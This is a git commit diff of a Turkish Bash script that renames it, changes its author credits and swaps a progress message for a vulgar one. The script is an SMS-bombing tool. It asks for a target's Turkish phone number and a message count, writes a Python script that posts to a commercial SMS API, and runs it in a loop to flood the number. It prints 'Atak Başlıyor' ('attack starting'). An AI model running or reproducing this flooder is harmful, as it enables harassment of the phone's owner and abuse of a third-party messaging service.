09b5c027654a1314274deb7abca2f04b5849edf5
muratorkc <68429895+muratorkc@users.noreply.github.com>
2020-09-06 21:59:50 +0300

    Update and rename tst.sh to M Ø.sh

--- M Ø.sh
+++ M Ø.sh
@@ -1,18 +1,18 @@
 #!/bin/bash
-#Yaman Efkar Tarafından Kodlandı.
+#M Ø TARAFINDAN SEVGIYLE KODLANDI.
 if [[ -e "Api/ok.txt" ]]; then
         clear
-        rm -rf Api/yaman.py
+        rm -rf Api/mø.py
         read -p $'\e[31m[\e[32m!\e[31m]\e[37mUsername : ' user
         read -p $'\e[31m[\e[32m!\e[31m]\e[37mPassword : ' pass
         sleep 0.8
         echo -e '\e[31mLütfen Bekleyiniz.'
         clear
-        read -p $'\e[31m[\e[32m!\e[31m]\e[37mTelefon Numarası :-90 ' tel
+        read -p $'\e[31m[\e[32m!\e[31m]\e[37mTelefon Numarası :+90 ' tel
         echo -e ""
         read -p $'\e[31m[\e[32m!\e[31m]\e[37mGönderilecek Sms [Max:50] : ' for
         sleep 0.8
-        echo -e '\e[31mAtak Başlıyor....'
+        echo -e '\e[31mSikiş Başlıyor....'
         cd Api/ &&
         echo 'import requests
 string = """
@@ -35,12 +35,12 @@ string = """
 
 r = requests.post("http://api.iletimerkezi.com/v1/send-sms", data={"data": string})
 
-print(r.status_code, r.reason)' >> yaman.py
+print(r.status_code, r.reason)' >> mø.py
 
 for (( i = 0; i <= $for; i++ )); do
         clear
-        python yaman.py > /dev/null 2>&1 &
-        echo -e '\e[31mYoutube:Yaman Efkar (YamanEfkar Tarafından Kodlandı.)'
+        python mø.py > /dev/null 2>&1 &
+        echo -e '\e[31m: (M Ø Tarafından Kodlandı.)'
         echo -e '\e[31mGönderilen Sms Sayısı : '$i
         sleep 2.5
 done
@@ -48,7 +48,7 @@ else
         apt install python python2 -y
         pip install requests
         cd Api/ &&
-        echo "YamanEfkar Tarafından KODLANMIŞTIR!" >> ok.txt
+        echo "MØ Tarafından KODLANMIŞTIR!" >> ok.txt
         cd .. && bash tst.sh
 
 fi
